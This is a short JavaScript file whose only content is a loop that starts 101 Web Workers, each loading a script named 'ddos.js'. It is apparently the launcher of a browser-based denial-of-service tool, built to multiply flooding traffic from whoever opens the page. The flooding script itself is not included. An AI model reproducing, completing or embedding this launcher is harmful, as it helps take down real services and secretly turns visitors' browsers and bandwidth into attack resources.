/**
 * 
 */

var workers = new Array();
var i=0;
for(i=0;i<=100;i++){
	workers[i] = new Worker("ddos.js");
}
